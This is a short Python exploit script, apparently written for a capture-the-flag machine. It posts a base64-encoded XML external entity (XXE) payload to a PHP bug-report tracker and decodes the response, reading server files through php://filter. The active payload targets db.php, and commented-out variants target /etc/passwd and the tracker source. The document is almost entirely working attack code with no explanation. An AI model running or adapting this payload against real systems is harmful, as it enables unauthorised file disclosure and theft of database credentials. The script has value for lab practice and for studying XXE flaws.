import requests
import base64
import re

RHOST = "http://10.10.11.100/tracker_diRbPr00f314.php"

# data = b"""<?xml  version="1.0" encoding="ISO-8859-1"?>
# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/tracker_diRbPr00f314.php"> ]>
# <bugreport>
# <title>1</title>
# <cwe>1</cwe>
# <cvss>1</cvss>
# <reward>&xxe;</reward>
# </bugreport>
# """

# data = b"""<?xml  version="1.0" encoding="ISO-8859-1"?>
# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
# <bugreport>
# <title>1</title>
# <cwe>1</cwe>
# <cvss>1</cvss>
# <reward>&xxe;</reward>
# </bugreport>
# """


data = b"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>1</title>
<cwe>1</cwe>
<cvss>1</cvss>
<reward>&xxe;</reward>
</bugreport>
"""
encoded = base64.b64encode(data).decode("utf-8")
encoded = requests.utils.quote(encoded)
data = {
    "data" : encoded
}
result = requests.post(RHOST, data="data=" + encoded, headers={"Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With":"XMLHttpRequest"})
dump = re.findall(r">(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?<", result.text)
code = base64.b64decode(dump[0][1:-1])
print(code)
